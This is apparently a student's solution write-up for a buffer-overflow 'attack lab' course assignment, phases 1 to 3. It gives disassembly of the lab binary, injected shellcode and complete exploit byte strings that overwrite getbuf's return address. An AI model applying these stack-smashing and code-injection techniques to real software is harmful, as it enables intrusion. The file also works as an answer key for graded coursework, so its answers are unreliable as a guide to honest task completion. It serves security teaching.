# attack_lab_solution

## Preface
To run this lab program, you should use the command `./ctarget -q` instead of `./ctarget` since there's no grading server.

## Phase 1
This phase is so easy and it just helps you to get familiar with this lab. You can choose to use the command objdump or just use gdb to solve this lab.
One way is to use the command objdump and then you get the corresponding source code of getbuf() and touch1() function:
``` asm00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40

```
It's clear that the address of touch1 should be 0x4017c0. Then you get the unique key to solve this problem. You also find that the command `sub $0x28, %rsp` allocates 40 bytes(0x28 = 40 in decimal). Then you just need to use some random bytes to fill up these 40 bytes and combine it with the address. 
It should be mentioned that you should know whether your system is little-endian or not, it decides the order of your answer. On my little-endian system, the answer could be 
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```

## Phase 2
We use the similar method to solve phase 2.
Firstly, let's have a look at the touch2 function, 
```
void touch2(unsigned val) {
  vlevel = 2;
  /* Part of validation protocol */ 
  if (val == cookie) {
  printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```
We know that the first argument is stored in the %rdi register, so we need to inject into the code to change the value of this register. 

We use the following code to change the value of %rdi
```
movq $0x59b997fa, %rdi
pushq $0x4017ec
retq
```
Note: the value of the cookie depends on your problem version.
We save the file and name it after phase2.s
then we use the command `gcc -c phase2.s` and `objdump -d phase2.o` to find the byte code 
```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3
```
Then similarly, we expand the byte code into 40 bytes, and let the jump address to be the address of rsp, which we can get by using gdb:
```
(gdb) until *0x4017b4
Type string:vsiuiusiugsiugifnsifsnfgnslkfsifnlisfn

Breakpoint 2, getbuf () at buf.c:16
16	in buf.c
(gdb) x/s $rsp
0x5561dc78:	"vsiuiusiugsiugifnsifsnfgnslkfsifnlisfn"
```
Here, we specify the jump address to be the address of rsp, which is also the address of the byte code we enter above. So the return address of getbuf will be changed. Then we accomplish the injection. 

## Phase 3
In phase3, we pass the address of the string as the argument. We can construct the solution based on phase2. Rather than moving the cookie directly in the assembly code, we pass the address of cookie this time. 

``` asm
movq $0x5561dca8, %rdi
pushq $0x4018fa
retq
```
Then we briefly talk about this constant. 0x5561dca8 = 0x5561dc78 + 0x30, where 0x5561dc78 is what we use in the phase 2(rsp). We use this 0x30 because of our structure of the final solution. We put the cookie string at the end of the byte code. To be more specific, 

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61
00

```
35 39 62 39 39 37 66 61 is the ascii byte code of our cookie string, and 00 is the sign used in C to indicate the end of a string. The other part is similar to what we talk about in phase2. 

